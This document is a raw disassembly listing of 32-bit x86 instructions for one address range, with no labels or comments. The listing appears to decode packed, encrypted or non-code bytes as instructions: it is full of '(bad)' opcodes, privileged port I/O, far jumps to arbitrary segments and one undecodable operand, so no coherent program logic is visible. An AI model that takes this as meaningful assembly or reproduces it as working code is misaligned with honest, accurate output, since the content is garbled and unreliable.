  41a12c:	ins    BYTE PTR es:[edi],dx
  41a12d:	xor    DWORD PTR [ecx+0x3],esp
  41a130:	test   DWORD PTR [ebx],edx
  41a132:	sub    ebx,DWORD PTR [eax-0x1abec370]
  41a138:	test   eax,0x535c550d
  41a13d:	daa    
  41a13e:	jl     0x41a12e
  41a140:	dec    ebx
  41a141:	dec    ebp
  41a142:	inc    eax
  41a143:	add    eax,0xc3977c97
  41a148:	jno    0x41a131
  41a14a:	ret    
  41a14b:	cmp    BYTE PTR [ebx],0xe3
  41a14e:	mov    bh,BYTE PTR [ecx-0xee7ec32]
  41a154:	fisubr DWORD PTR [edx-0xa]
  41a157:	cdq    
  41a158:	out    0x1f,al
  41a15a:	popf   
  41a15b:	pop    es
  41a15c:	(bad)  
  41a15e:	jnp    0x41a1d9
  41a160:	ja     0x41a161
  41a162:	jae    0x41a13c
  41a164:	loope  0x41a114
  41a166:	or     edx,esi
  41a168:	icebp  
  41a169:	dec    esp
  41a16a:	cmp    DWORD PTR [ecx-0x13],0x33
  41a16e:	jl     0x41a15c
  41a170:	xchg   esi,eax
  41a171:	pushf  
  41a172:	data16 mov fs,WORD PTR ds:0x8efdad16
  41a179:	sbb    al,ch
  41a17b:	shr    BYTE PTR ds:0x81950e3f,1
  41a181:	pop    eax
  41a182:	cwde   
  41a183:	fadd   st,st(0)
  41a185:	or     ah,BYTE PTR [ecx+edx*4]
  41a188:	call   0x980d:0x65357687
  41a18f:	mov    ch,BYTE PTR [edi]
  41a191:	out    dx,al
  41a192:	sub    eax,0x9b7cead6
  41a197:	xor    eax,0xa106523b
  41a19c:	xor    BYTE PTR [esp+edx*2],ch
  41a19f:	xlat   BYTE PTR ds:[ebx]
  41a1a0:	ficom  WORD PTR [edx-0x432cb02f]
  41a1a6:	jb     0x41a193
  41a1a8:	xchg   esi,eax
  41a1a9:	lods   eax,DWORD PTR ds:[esi]
  41a1aa:	idiv   DWORD PTR [ecx-0x3b]
  41a1ad:	xchg   esp,eax
  41a1ae:	pusha  
  41a1af:	push   eax
  41a1b0:	retf   0x5162
  41a1b3:	aas    
  41a1b4:	jl     0x41a1d9
  41a1b6:	js     0x41a196
  41a1b8:	outs   dx,DWORD PTR ds:[esi]
  41a1b9:	xor    edx,DWORD PTR [ebp+0x38]
  41a1bc:	iret   
  41a1bd:	sub    dh,BYTE PTR [eax+0x6ee9014a]
  41a1c3:	imul   DWORD PTR [eax-0x45]
  41a1c6:	lahf   
  41a1c7:	ins    BYTE PTR es:[edi],dx
  41a1c8:	dec    esp
  41a1c9:	add    cl,BYTE PTR [ebx-0x5b]
  41a1cc:	test   eax,0xb116ae1e
  41a1d1:	nop
  41a1d2:	iret   
  41a1d3:	test   al,0xf
  41a1d5:	xor    eax,0xd25cea42
  41a1da:	loopne 0x41a20a
  41a1dc:	enter  0x19bc,0xd5
  41a1e0:	xchg   edx,eax
  41a1e1:	mov    BYTE PTR [ebx],ch
  41a1e3:	or     al,0x85
  41a1e5:	inc    esi
  41a1e6:	icebp  
  41a1e7:	daa    
  41a1e8:	retf   
  41a1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ea:	fdiv   QWORD PTR [ebp+edx*8+0x1b]
  41a1ee:	lods   eax,DWORD PTR ds:[esi]
  41a1ef:	mov    edx,0xb2aefce2
  41a1f4:	mov    al,ds:0x7d3795d7
  41a1f9:	sbb    eax,0x78f10778
  41a1fe:	enter  0x2a8d,0xbc
  41a202:	jae    0x41a22a
  41a204:	pop    ecx
  41a205:	mov    cl,0xfb
  41a207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a208:	jecxz  0x41a240
  41a20a:	or     eax,DWORD PTR [edx+0x30]
  41a20d:	mov    eax,0xd5f867a3
  41a212:	pusha  
  41a213:	push   es
  41a214:	icebp  
  41a215:	xor    esi,0xfdfe68cf
  41a21b:	retf   
  41a21c:	jbe    0x41a28d
  41a21e:	imul   eax,edi,0xda3f5102
  41a224:	sub    DWORD PTR [eax-0x4e21ae48],esp
  41a22a:	or     al,0xb5
  41a22c:	rcl    BYTE PTR ds:0x296ac738,0x1e
  41a233:	jmp    0xd0167919
  41a238:	(bad)  
  41a239:	ret    0xc479
  41a23c:	iret   
  41a23d:	bound  esp,QWORD PTR [esi-0x1f]
  41a240:	pop    es
  41a241:	out    0xe3,eax
  41a243:	dec    ebp
  41a244:	fwait
  41a245:	mov    edi,0x8c8e0ef1
  41a24a:	jp     0x41a1db
  41a24c:	mov    ah,0xd1
  41a24e:	add    eax,0xd7f5ad84
  41a253:	outs   dx,BYTE PTR ds:[esi]
  41a254:	lods   al,BYTE PTR ds:[esi]
  41a255:	fcom   QWORD PTR [ebp*2+0x73362f88]
  41a25c:	gs stos DWORD PTR es:[edi],eax
  41a25e:	enter  0xf5fd,0xd5
  41a262:	inc    eax
  41a263:	pop    esp
  41a264:	arpl   dx,di
  41a266:	lods   eax,DWORD PTR ds:[esi]
  41a267:	xor    BYTE PTR [ecx],0x6d
  41a26a:	into   
  41a26b:	mov    al,0x40
  41a26d:	sub    al,BYTE PTR [ebx+0x3]
  41a270:	loopne 0x41a20e
  41a272:	adc    eax,0x967e9245
  41a277:	popa   
  41a278:	aam    0x7c
  41a27a:	fldenv [ecx-0x61]
  41a27d:	jmp    FWORD PTR [eax-0x53]
  41a280:	imul   BYTE PTR [ecx+0x2d]
  41a283:	pop    ss
  41a284:	(bad)  
  41a285:	lahf   
  41a286:	imul   esi,edx,0x51
  41a289:	jmp    0x937c:0xdf23f506
  41a290:	cs pop ebx
  41a292:	fnstcw WORD PTR [ebx-0x5e9b4487]
  41a298:	inc    ebx
  41a299:	xchg   ebp,eax
  41a29a:	jne    0x41a2df
  41a29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a29d:	adc    BYTE PTR [edx+0x74],0x78
  41a2a1:	das    
  41a2a2:	fwait
  41a2a3:	mov    ds:0xbf5a1431,eax
  41a2a8:	mov    BYTE PTR [esi-0x1e],0x9b
  41a2ac:	js     0x41a2ed
  41a2ae:	call   0x4c69:0x4551062e
  41a2b5:	mov    bh,0xb
  41a2b7:	imul   BYTE PTR [edx+0x1d]
  41a2ba:	mov    dl,0x91
  41a2bc:	jno    0x41a295
  41a2be:	je     0x41a2b7
  41a2c0:	js     0x41a2d1
  41a2c2:	jo     0x41a2bb
  41a2c4:	leave  
  41a2c5:	nop
  41a2c6:	das    
  41a2c7:	inc    edx
  41a2c8:	xor    al,0x64
  41a2ca:	lahf   
  41a2cb:	call   0x98c:0x8b405162
  41a2d2:	fmul   QWORD PTR [edx]
  41a2d4:	pop    ebp
  41a2d5:	ins    DWORD PTR es:[edi],dx
  41a2d6:	sbb    al,0xed
  41a2d8:	or     eax,0xfc04510e
  41a2dd:	push   edx
  41a2de:	sub    ch,ah
  41a2e0:	sbb    dh,BYTE PTR [ecx+0x6f]
  41a2e3:	dec    esp
  41a2e4:	lds    eax,FWORD PTR [esi-0x3c]
  41a2e7:	dec    ebx
  41a2e8:	xor    edi,DWORD PTR [ebx+0x371eca08]
  41a2ee:	and    eax,0x2cd6407b
  41a2f3:	add    eax,0xe28878eb
  41a2f8:	loop   0x41a27f
  41a2fa:	stos   DWORD PTR es:[edi],eax
  41a2fb:	popf   
  41a2fc:	dec    ebp
  41a2fd:	sub    eax,ecx
  41a2ff:	inc    ebx
  41a300:	cmc    
  41a301:	lock mov ds:0x23bf960b,eax
  41a307:	pop    edx
  41a308:	push   ebp
  41a309:	mov    ebp,0x539e365c
  41a30e:	mov    al,0xfe
  41a310:	sub    al,0x61
  41a312:	sub    cl,bl
  41a314:	xor    BYTE PTR ds:0x4c6617b4,dh
  41a31a:	loopne 0x41a2a2
  41a31c:	outs   dx,DWORD PTR ds:[esi]
  41a31d:	dec    ebp
  41a31e:	add    eax,0x99a919e3
  41a323:	jecxz  0x41a347
  41a325:	mov    eax,0xb59c03e
  41a32a:	mov    ch,0x7a
  41a32c:	in     eax,dx
  41a32d:	mov    al,0xb2
  41a32f:	sahf   
  41a330:	pop    ebx
  41a331:	mov    cl,BYTE PTR [ebp+ebx*4-0x6c5ed2b1]
  41a338:	mov    bl,0x90
  41a33a:	int3   
  41a33b:	adc    eax,DWORD PTR [esi]
  41a33d:	imul   edi,DWORD PTR [esi+0x5f],0x33
  41a341:	lods   eax,DWORD PTR ds:[esi]
  41a342:	shl    BYTE PTR [edx],1
  41a344:	mov    edi,DWORD PTR [edi]
  41a346:	sub    BYTE PTR [eax-0x3],ah
  41a349:	mov    WORD PTR [ebp-0x20],gs
  41a34c:	out    dx,al
  41a34d:	jno    0x41a2e3
  41a34f:	sub    edx,eax
  41a351:	inc    ebx
  41a352:	xchg   esi,eax
  41a353:	xchg   dh,bl
  41a355:	push   esi
  41a356:	pop    ebp
  41a357:	push   ss
  41a358:	call   0xc6194c1e
  41a35d:	es not ch
  41a360:	cmp    dl,BYTE PTR [eax+0xdfa0fc2]
  41a366:	adc    eax,0x425bdade
  41a36b:	es ins BYTE PTR es:[edi],dx
  41a36d:	push   ebx
  41a36e:	xchg   esp,eax
  41a36f:	xchg   edx,eax
  41a370:	add    DWORD PTR [ebx-0x3],0xffffff9e
  41a374:	(bad)  [esi+eiz*2-0x2]
  41a378:	dec    ebx
  41a379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a37a:	sbb    eax,0x62
  41a37d:	cli    
  41a37e:	retf   
  41a37f:	or     ah,BYTE PTR [eax-0x80]
  41a382:	push   ds
  41a383:	adc    bl,cl
  41a385:	jnp    0x41a3b3
  41a387:	cmp    BYTE PTR [edx+0x7c],0xe1
  41a38b:	cmp    al,0x6e
  41a38d:	add    esp,ecx
  41a38f:	xchg   BYTE PTR [esi],ch
  41a391:	xchg   esp,eax
  41a392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a393:	std    
  41a394:	jo     0x41a396
  41a396:	push   ss
  41a397:	push   ebp
  41a398:	sub    al,0xd1
  41a39a:	clc    
  41a39b:	jmp    0x6d1f:0xe662b02f
  41a3a2:	push   cs
  41a3a3:	jns    0x41a3b5
  41a3a5:	xchg   esp,eax
  41a3a6:	inc    ecx
  41a3a7:	mov    al,0x60
  41a3a9:	iret   
  41a3aa:	ds jno 0x41a399
  41a3ad:	pusha  
  41a3ae:	aam    0x2e
  41a3b0:	lahf   
  41a3b1:	out    0x27,eax
  41a3b3:	and    eax,0xee2f9929
  41a3b8:	outs   dx,BYTE PTR ds:[esi]
  41a3b9:	xchg   esi,eax
  41a3ba:	outs   dx,DWORD PTR ds:[esi]
  41a3bb:	add    edx,DWORD PTR [edx+edi*8+0x3b6983e2]
  41a3c2:	aas    
  41a3c3:	mov    ebx,0xe42c659a
  41a3c8:	mov    bh,0x15
  41a3ca:	inc    ebp
  41a3cb:	(bad)  
  41a3cc:	jge    0x41a38d
  41a3ce:	(bad)  
  41a3cf:	lods   al,BYTE PTR ds:[esi]
  41a3d0:	ins    DWORD PTR es:[edi],dx
  41a3d1:	sbb    ch,BYTE PTR [eax-0x5]
  41a3d4:	rcr    DWORD PTR [ebp+0x2b0a4d6a],1
  41a3da:	xchg   esp,eax
  41a3db:	bound  ecx,QWORD PTR [ecx+0x3ce4fa7d]
  41a3e1:	jle    0x41a451
  41a3e3:	mov    al,0x31
  41a3e5:	inc    edx
  41a3e6:	jnp    0x41a454
  41a3e8:	add    ah,cl
  41a3ea:	sbb    DWORD PTR [ebx+0x17],eax
  41a3ed:	dec    ecx
  41a3ee:	pop    ebp
  41a3ef:	pop    eax
  41a3f0:	aaa    
  41a3f1:	and    eax,0xac7909d8
  41a3f6:	ins    BYTE PTR es:[edi],dx
  41a3f7:	ret    
  41a3f8:	fisub  DWORD PTR [eax]
  41a3fa:	jnp    0x41a3ea
  41a3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3fd:	cmp    ebx,DWORD PTR [edx]
  41a3ff:	push   es
  41a400:	leave  
  41a401:	ficomp DWORD PTR [esi+0x76]
  41a404:	cmp    al,0xb9
  41a406:	xchg   ecx,eax
  41a407:	xchg   esp,eax
  41a408:	ss mov ds,ecx
  41a40b:	push   cs
  41a40c:	dec    eax
  41a40d:	ss mov esp,0xf9869a23
  41a413:	sbb    bl,BYTE PTR [esi+0x65f30eb2]
  41a419:	cmp    eax,0xfb393d14
  41a41e:	je     0x41a3c5
  41a420:	call   0xa30cc88e
  41a425:	cwde   
  41a426:	hlt    
  41a427:	retf   
  41a428:	pop    esi
  41a429:	pushf  
  41a42a:	or     ebx,DWORD PTR [edx+0x1d]
  41a42d:	push   ebp
  41a42e:	cmc    
  41a42f:	xlat   BYTE PTR ds:[ebx]
  41a430:	jmp    0xbe441922
  41a435:	ret    0x29f5
  41a438:	xchg   ebp,eax
  41a439:	dec    edx
  41a43a:	xchg   edi,eax
  41a43b:	loopne 0x41a3f5
  41a43d:	ins    DWORD PTR es:[edi],dx
  41a43e:	lods   eax,DWORD PTR ds:[esi]
  41a43f:	(bad)  
  41a440:	sti    
  41a441:	sbb    ebp,DWORD PTR [esp+eiz*4+0x7bd2a27a]
  41a448:	or     edi,DWORD PTR [eax+0x56809ccb]
  41a44e:	jmp    0x8d40:0x80cf84d6
  41a455:	push   es
  41a456:	sysret 
  41a458:	popf   
  41a459:	adc    al,0xb0
  41a45b:	mov    ch,0x9a
  41a45d:	mov    esp,0x681a7d06
  41a462:	pop    esi
  41a463:	retf   0x7321
  41a466:	in     al,dx
  41a467:	dec    ebp
  41a468:	inc    eax
  41a469:	pop    ss
  41a46a:	push   ebx
  41a46b:	inc    edi
  41a46c:	pop    esp
  41a46d:	adc    al,0xd6
  41a46f:	rcl    edi,1
  41a471:	mov    BYTE PTR [edx+eax*4+0x46b899cd],bh
  41a478:	(bad)  
  41a479:	cmp    eax,0x4a5f4be1
  41a47e:	pop    ebp
  41a47f:	in     al,dx
  41a480:	jb     0x41a4bc
  41a482:	pop    eax
  41a483:	mov    al,dh
  41a485:	js     0x41a4aa
  41a487:	cmp    al,0xc0
  41a489:	add    eax,0xffffffb4
  41a48c:	(bad)  
  41a48d:	divps  xmm2,XMMWORD PTR [edx-0x63]
  41a491:	shl    DWORD PTR [esi],cl
  41a493:	pushf  
  41a494:	in     eax,0xa
  41a496:	and    BYTE PTR [edi-0x1e],dl
  41a499:	sub    cl,ch
  41a49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a49c:	(bad)  
  41a49d:	(bad)  [ecx+0xc]
  41a4a0:	sub    eax,0x39c285ee
  41a4a5:	mov    al,ds:0x9616117c
  41a4aa:	lods   eax,DWORD PTR ds:[esi]
  41a4ab:	cmp    al,BYTE PTR [eax+0x63439a64]
  41a4b1:	mov    edi,0x7359726c
  41a4b6:	(bad)  
  41a4b7:	ss loopne 0x41a4ef
  41a4ba:	fwait
  41a4bb:	call   0x3841d8ea
  41a4c0:	sub    eax,0x7b9aa1ad
  41a4c5:	daa    
  41a4c6:	pusha  
  41a4c7:	xchg   ebp,eax
  41a4c8:	lods   al,BYTE PTR ds:[esi]
  41a4c9:	sub    BYTE PTR [ebx],bh
  41a4cb:	or     bl,BYTE PTR [ebx-0xc]
  41a4ce:	and    al,0xdc
  41a4d0:	add    edx,ecx
  41a4d2:	clc    
  41a4d3:	aad    0x76
  41a4d5:	sub    BYTE PTR [eax],dh
  41a4d7:	push   edx
  41a4d8:	push   edi
  41a4d9:	out    0x84,al
  41a4db:	adc    eax,0xb07f7145
  41a4e0:	iret   
  41a4e1:	call   0xaf13f0c7
  41a4e6:	loopne 0x41a55c
  41a4e8:	mov    edi,DWORD PTR [esp+edi*8]
  41a4eb:	mov    ecx,esp
  41a4ed:	bound  ebp,QWORD PTR [esi+ebp*2-0x2c]
  41a4f1:	out    0x8e,al
  41a4f3:	mov    ebx,0x634a27ab
  41a4f8:	icebp  
  41a4f9:	pop    esi
  41a4fa:	add    ebx,edi
  41a4fc:	mov    ah,dl
  41a4fe:	mov    eax,0x1b503ce9
  41a503:	xor    eax,0xa4c3ab46
  41a508:	bswap  edx
  41a50a:	jg     0x41a56f
  41a50c:	push   eax
  41a50d:	pop    edx
  41a50e:	retf   
  41a50f:	xchg   BYTE PTR [edx],dh
  41a511:	test   DWORD PTR [ecx],ebp
  41a513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a514:	xchg   esp,eax
  41a515:	outs   dx,BYTE PTR ds:[esi]
  41a516:	iret   
  41a517:	fnstsw WORD PTR [edi]
  41a519:	imul   eax,edx,0x8c99d600
  41a51f:	mov    bh,0x7d
  41a521:	fwait
  41a522:	inc    ebx
  41a523:	and    BYTE PTR [ebx-0x23253f92],bl
  41a529:	es mov ebp,0xa891e36d
  41a52f:	mov    ebx,0xe59448d9
  41a534:	rol    DWORD PTR [eax-0x4f],cl
  41a537:	push   esi
  41a538:	inc    eax
  41a539:	adc    eax,ecx
  41a53b:	out    dx,eax
  41a53c:	sti    
  41a53d:	je     0x41a5ab
  41a53f:	mov    ds:0xd63f80e9,eax
  41a544:	fistp  WORD PTR [esi+ebp*1+0x3f]
  41a548:	cmc    
  41a549:	(bad)  
  41a54a:	shl    ecx,1
  41a54c:	leave  
  41a54d:	jmp    0x285:0xcae41b0d
  41a554:	xor    al,0xe1
  41a556:	sbb    DWORD PTR [eax],edi
  41a558:	and    dh,BYTE PTR cs:[esi+0x1bacc79d]
  41a55f:	sub    BYTE PTR [eax-0x3],0xad
  41a563:	das    
  41a564:	mov    ecx,0x591e91a0
  41a569:	dec    edi
  41a56a:	inc    ebx
  41a56b:	dec    esi
  41a56c:	jb     0x41a58f
  41a56e:	idiv   BYTE PTR [eax+0x44eade86]
  41a574:	out    0xef,eax
  41a576:	inc    esi
  41a577:	mov    dh,0x32
  41a579:	icebp  
  41a57a:	mov    ch,0x32
  41a57c:	inc    eax
  41a57d:	(bad)  [ebx+0x264fba34]
  41a583:	sub    ch,BYTE PTR [eax]
  41a585:	add    DWORD PTR [ecx-0x3406e552],esi
  41a58b:	inc    edx
  41a58c:	or     esi,esp
  41a58e:	mov    gs,WORD PTR [eax]
  41a590:	cmp    WORD PTR [edx+ebx*2-0x5061a76d],di
  41a598:	jnp    0x41a5ec
  41a59a:	sbb    bl,BYTE PTR [ecx+eax*8]
  41a59d:	sti    
  41a59e:	push   0x78834f46
  41a5a3:	jns    0x41a5aa
  41a5a5:	jmp    0x74af:0xd31a42b6
  41a5ac:	and    al,0x75
  41a5ae:	push   0xd8987523
  41a5b3:	mov    al,0x61
  41a5b5:	adc    eax,0x65750ab8
  41a5ba:	add    BYTE PTR [ebx],bl
  41a5bc:	add    eax,0xa781670c
  41a5c1:	xchg   esp,eax
  41a5c2:	mov    esi,0x1c95b4c9
  41a5c7:	outs   dx,DWORD PTR ds:[esi]
  41a5c8:	(bad)  
  41a5c9:	or     DWORD PTR [ebx],esp
  41a5cb:	mov    dh,0xca
  41a5cd:	fcomip st,st(3)
  41a5cf:	repz jl 0x41a5c6
  41a5d2:	pop    edi
  41a5d3:	fdiv   QWORD PTR [ebp+0x5d1461a2]
  41a5d9:	cmp    DWORD PTR [ecx-0x2b],0x18d75f7b
  41a5e0:	xchg   ebp,eax
  41a5e1:	fnstsw WORD PTR [esi]
  41a5e3:	pop    edi
  41a5e4:	xlat   BYTE PTR ds:[ebx]
  41a5e5:	xchg   ebp,eax
  41a5e6:	sbb    DWORD PTR [edx-0x76],ebp
  41a5e9:	jne    0x41a628
  41a5eb:	cmp    eax,0x34157e5c
  41a5f0:	mov    al,ds:0xfbb3b871
  41a5f5:	mov    bh,0xca
  41a5f7:	test   BYTE PTR [esi+0x2eded032],bl
  41a5fd:	call   0xdff:0xc9fe6320
  41a604:	cwde   
  41a605:	mov    BYTE PTR [edx+0x72],0x89
  41a609:	jbe    0x41a647
  41a60b:	mov    edi,ecx
  41a60d:	or     DWORD PTR [edi],ebp
  41a60f:	rcr    BYTE PTR [edi-0x18d86013],cl
  41a615:	test   BYTE PTR [ebx],bh
  41a617:	mov    ebp,0x4de9e2c8
  41a61c:	ss adc dh,dh
  41a61f:	adc    dl,dl
  41a621:	push   edx
  41a622:	fsubr  DWORD PTR [edx+0x1a1b28b4]
  41a628:	and    esi,DWORD PTR [esi-0x20]
  41a62b:	cmp    edi,DWORD PTR [edi]
  41a62d:	push   ebx
  41a62e:	test   DWORD PTR [eax],0xc05ddbad
  41a634:	adc    al,0xec
  41a636:	(bad)  
  41a637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a638:	xlat   BYTE PTR ds:[ebx]
  41a639:	cdq    
  41a63a:	jecxz  0x41a5c0
  41a63c:	and    BYTE PTR [ebp+0x60e13f28],0x21
  41a643:	mov    eax,ds:0xeb8f7666
  41a648:	out    dx,al
  41a649:	push   esp
  41a64a:	js     0x41a5ef
  41a64c:	aam    0x57
  41a64e:	(bad)  
  41a64f:	es jb  0x41a5d8
  41a652:	push   ss
  41a653:	enter  0xaa0e,0x5e
  41a657:	push   ebx
  41a658:	sbb    dh,cl
  41a65a:	mov    ecx,0x58086e63
  41a65f:	retf   
  41a660:	sbb    eax,0x8e5bdd82
  41a665:	aad    0x48
  41a667:	jmp    0xf22f878
  41a66c:	into   
  41a66d:	aam    0x5f
  41a66f:	mov    ch,0xea
  41a671:	popf   
  41a672:	cmp    eax,0x5406d0e
  41a677:	pop    ds
  41a678:	jmp    0xf7e4a334
  41a67d:	loop   0x41a6c5
  41a67f:	stc    
  41a680:	stos   BYTE PTR es:[edi],al
  41a681:	shl    dh,cl
  41a683:	aaa    
  41a684:	enter  0x16e9,0xc1
  41a688:	dec    eax
  41a689:	adc    BYTE PTR [ebp-0x42ac3eed],dl
  41a68f:	enter  0x5938,0xb2
  41a693:	(bad)  
  41a694:	(bad)  
  41a695:	mov    esi,0x85739f36
  41a69a:	outs   dx,BYTE PTR ds:[esi]
  41a69b:	(bad)
  41a69e:	adc    al,0x5c
  41a6a0:	inc    esp
  41a6a1:	xor    eax,0x51be5dc8
  41a6a6:	jns    0x41a6c0
  41a6a8:	or     edx,DWORD PTR [edx]
  41a6aa:	arpl   WORD PTR [esi-0x6a],dx
  41a6ad:	mov    dl,0xe3
  41a6af:	repz push ebp
  41a6b1:	cmp    ecx,DWORD PTR [esi+0x3c]
  41a6b4:	les    esi,FWORD PTR [edx+0x299060f2]
  41a6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6bb:	push   ds
  41a6bc:	adc    BYTE PTR [eax-0x52],al
  41a6bf:	mov    dl,0x55
  41a6c1:	lock loop 0x41a66e
  41a6c4:	push   ecx
  41a6c5:	mov    bl,0xe5
  41a6c7:	mov    ds:0x33e055b0,eax
  41a6cc:	nop
  41a6cd:	test   al,0xea
  41a6cf:	(bad)  
  41a6d0:	loope  0x41a69e
  41a6d2:	sar    DWORD PTR gs:[esi-0x7be0eae3],0xe0
  41a6da:	jmp    0x65b7:0x17babf85
  41a6e1:	fcom   DWORD PTR [esp+eax*2]
  41a6e4:	inc    ebp
  41a6e5:	inc    edi
  41a6e6:	add    ebx,ecx
  41a6e8:	arpl   si,bx
  41a6ea:	pop    edx
  41a6eb:	dec    ecx
  41a6ec:	aad    0xd1
  41a6ee:	dec    esi
  41a6ef:	jmp    0x88c:0x636a3471
  41a6f6:	jns    0x41a759
  41a6f8:	dec    ebx
  41a6f9:	stos   BYTE PTR es:[edi],al
  41a6fa:	loopne 0x41a737
  41a6fc:	das    
  41a6fd:	xor    cl,cl
  41a6ff:	or     eax,0x5863050
  41a704:	aam    0x9f
  41a706:	fucomi st,st(4)
  41a708:	mov    ecx,0x769ac2df
  41a70d:	jns    0x41a72d
  41a70f:	add    edx,DWORD PTR [esp+ebp*2+0x733d4fa4]
  41a716:	jnp    0x41a6a4
  41a718:	pop    ss
  41a719:	lds    eax,FWORD PTR [edi]
  41a71b:	push   ss
  41a71c:	dec    eax
  41a71d:	les    eax,FWORD PTR [ebx-0x304bbf6c]
  41a723:	xor    eax,0xe894ec94
  41a728:	mov    ds:0x2d557c8b,eax
  41a72d:	cwde   
  41a72e:	xor    DWORD PTR [edi-0x6e],0x77
  41a732:	(bad)  
  41a733:	mov    BYTE PTR [ecx],bh
  41a735:	sub    al,0xa8
  41a737:	cmp    eax,DWORD PTR [edx+ebp*4-0x235d6775]
  41a73e:	shr    DWORD PTR [eax+ebp*4+0x646a696b],cl
  41a745:	push   es
  41a746:	out    0x92,al
  41a748:	xor    al,0xde
  41a74a:	rol    DWORD PTR [edi-0x57b2af79],1
  41a750:	mov    esi,0xebbb435
  41a755:	je     0x41a742
  41a757:	jbe    0x41a6e8
  41a759:	xor    BYTE PTR [ebx],dh
  41a75b:	in     eax,dx
  41a75c:	outs   dx,DWORD PTR ds:[esi]
  41a75d:	(bad)  
  41a75e:	sbb    cl,cl
  41a760:	fisub  DWORD PTR ds:0x282a5f7b
  41a766:	nop
  41a767:	xchg   ebp,eax
  41a768:	jmp    0x2e9869f2
  41a76d:	enter  0x7a7d,0xf3
  41a771:	xlat   BYTE PTR ds:[ebx]
  41a772:	aad    0x37
  41a774:	hlt    
  41a775:	add    al,0xda
  41a777:	xchg   ebp,eax
  41a778:	repnz mov ebp,0xeeecd635
  41a77e:	mov    bl,0xbf
  41a780:	mov    cl,ch
  41a782:	or     BYTE PTR [edx+ebx*4],dh
  41a785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a786:	jle    0x41a77f
  41a788:	mov    BYTE PTR [ecx+eax*4-0x1ed12e5d],al
  41a78f:	repz pop es
  41a791:	cmp    BYTE PTR [ecx-0x53],dh
  41a794:	fs xchg ecx,eax
  41a796:	jae    0x41a736
  41a798:	sub    ch,al
  41a79a:	icebp  
  41a79b:	fcmovbe st,st(1)
  41a79d:	push   0xffffffd6
  41a79f:	lds    edi,FWORD PTR [ebx+0x6680c648]
  41a7a5:	out    dx,eax
  41a7a6:	add    DWORD PTR [esp+edx*2-0x2],0xffffffee
  41a7ab:	mov    esp,0x18c20025
  41a7b0:	inc    edi
  41a7b1:	fist   WORD PTR [edx]
  41a7b3:	mov    ?,ebp
  41a7b5:	dec    esi
  41a7b6:	sti    
  41a7b7:	outs   dx,DWORD PTR ds:[esi]
  41a7b8:	or     edi,esp
  41a7ba:	loopne 0x41a82c
  41a7bc:	xor    al,0x45
  41a7be:	mov    dl,0x34
  41a7c0:	leave  
  41a7c1:	jo     0x41a771
  41a7c3:	pop    edx
  41a7c4:	sar    BYTE PTR [edi],cl
  41a7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7c7:	xor    ch,BYTE PTR [ebp-0x3a5f9833]
  41a7cd:	xor    ecx,ebx
  41a7cf:	dec    edx
  41a7d0:	(bad)  
  41a7d1:	mov    al,ds:0x6dca6c5a
  41a7d6:	jmp    0xcf57:0xee667185
  41a7dd:	xor    al,0xc0
  41a7df:	mov    bl,0xb1
  41a7e1:	adc    BYTE PTR [edx+eax*1+0x16],0x91
  41a7e6:	ss pop esp
  41a7e8:	daa    
  41a7e9:	pop    es
  41a7ea:	xchg   esp,eax
  41a7eb:	in     al,0x5c
  41a7ed:	(bad)  
  41a7ee:	sti    
  41a7ef:	jl     0x41a7bd
  41a7f1:	retf   0x950
  41a7f4:	sbb    dh,BYTE PTR [ecx+0x45cbd363]
  41a7fa:	push   eax
  41a7fb:	in     eax,0xf8
  41a7fd:	jnp    0x41a852
  41a7ff:	sub    BYTE PTR [ebx],al
  41a801:	js     0x41a7a7
  41a803:	fcom   QWORD PTR ds:[ebp-0x3c]
  41a807:	ret    
  41a808:	and    esi,ecx
  41a80a:	xor    BYTE PTR ds:0x404bdb73,bl
  41a810:	and    al,dh
  41a812:	lods   eax,DWORD PTR ds:[esi]
  41a813:	popa   
  41a814:	cmc    
  41a815:	cwde   
  41a816:	cmp    DWORD PTR [edi],0x9cf75d17
  41a81c:	mov    bl,dl
  41a81e:	mov    cl,ah
  41a820:	adc    BYTE PTR [edi+ecx*2],dl
  41a823:	inc    edx
  41a824:	jmp    0x41a80d
  41a826:	jg     0x41a872
  41a828:	loopne 0x41a862
  41a82a:	(bad)  
  41a82b:	(bad)  
  41a82d:	lea    ecx,[ecx-0x351dfe07]
  41a833:	out    dx,al
  41a834:	ja     0x41a81a
  41a836:	mov    cl,BYTE PTR [ebx+0x587300c1]
  41a83c:	rcr    BYTE PTR [ecx+0x4a],cl
  41a83f:	jmp    0x41a839
  41a841:	test   eax,0x5b298d6c
  41a846:	test   al,0xa9
  41a848:	pop    ebp
  41a849:	scas   al,BYTE PTR es:[edi]
  41a84a:	pop    es
  41a84b:	mov    dl,dh
  41a84d:	add    ecx,eax
  41a84f:	bound  ecx,QWORD PTR [edx+0x4a]
  41a852:	jp     0x41a861
  41a854:	xadd   ecx,edx
  41a857:	outs   dx,BYTE PTR ds:[esi]
  41a858:	aaa    
  41a859:	and    edi,DWORD PTR [edi+0x482ee65c]
  41a85f:	add    DWORD PTR [esi+0x11],edx
  41a862:	rol    BYTE PTR [ebx-0x78],1
  41a865:	data16 stc 
  41a867:	js     0x41a836
  41a869:	push   0xcedcc81d
  41a86e:	pop    es
  41a86f:	stc    
  41a870:	adc    ecx,DWORD PTR [ebx]
  41a872:	inc    edi
  41a873:	cmp    esp,eax
  41a875:	inc    esp
  41a876:	or     esi,DWORD PTR [ebx+0x5a]
  41a879:	std    
  41a87a:	xchg   ebp,eax
  41a87b:	or     BYTE PTR [ebp+eax*1-0x24],bl
  41a87f:	dec    esi
  41a880:	adc    eax,0x2069f2fc
  41a885:	jmp    0x88ee3b74
  41a88a:	mov    fs,WORD PTR [eax+0x32]
  41a88d:	sar    ebx,0xd9
  41a890:	mov    ds:0x282acd63,eax
  41a895:	push   eax
